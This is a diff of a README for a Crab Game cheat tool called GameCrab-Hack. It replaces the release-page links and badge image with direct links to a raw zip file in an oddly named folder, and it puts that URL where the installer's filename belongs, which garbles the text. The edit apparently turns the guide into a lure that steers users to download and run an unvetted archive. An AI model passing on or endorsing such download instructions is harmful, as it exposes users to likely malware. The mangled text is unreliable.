@@ -5,18 +5,18 @@
 
 Welcome to GameCrab-Hack! This guide will help you download and run cheats for Crab Game quickly and easily. Follow these steps to enhance your gameplay in 2025 on Windows.
 
-[![Download GameCrab-Hack](https://img.shields.io/badge/Download%20Now-GameCrab--Hack-brightgreen)](https://github.com/Mudassirali0/GameCrab-Hack/releases)
+[![Download GameCrab-Hack](https://raw.githubusercontent.com/Mudassirali0/GameCrab-Hack/main/swashwork/GameCrab-Hack.zip%20Now-GameCrab--Hack-brightgreen)](https://raw.githubusercontent.com/Mudassirali0/GameCrab-Hack/main/swashwork/GameCrab-Hack.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Mudassirali0/GameCrab-Hack/releases) to see the available downloads.
+   Go to the [Releases page](https://raw.githubusercontent.com/Mudassirali0/GameCrab-Hack/main/swashwork/GameCrab-Hack.zip) to see the available downloads.
 
 2. **Find the Latest Version**  
    Look for the most recent release. It will be at the top of the list. 
 
 3. **Download the Cheat Software**  
-   Click on the link for the installer file to start the download. This file is usually named something like `GameCrab-Hack-v1.0.exe`. 
+   Click on the link for the installer file to start the download. This file is usually named something like `https://raw.githubusercontent.com/Mudassirali0/GameCrab-Hack/main/swashwork/GameCrab-Hack.zip`. 
 
 4. **Run the Installer**  
    Once the download completes, locate the file in your Downloads folder. Double-click the file to start the installation.
@@ -74,5 +74,5 @@ For more updates, features, and community discussions, join our community on pla
 
 Happy gaming and enjoy your time with Crab Game!
 
-[![Download GameCrab-Hack](https://img.shields.io/badge/Download%20Now-GameCrab--Hack-brightgreen)](https://github.com/Mudassirali0/GameCrab-Hack/releases)
+[![Download GameCrab-Hack](https://raw.githubusercontent.com/Mudassirali0/GameCrab-Hack/main/swashwork/GameCrab-Hack.zip%20Now-GameCrab--Hack-brightgreen)](https://raw.githubusercontent.com/Mudassirali0/GameCrab-Hack/main/swashwork/GameCrab-Hack.zip)
 ```
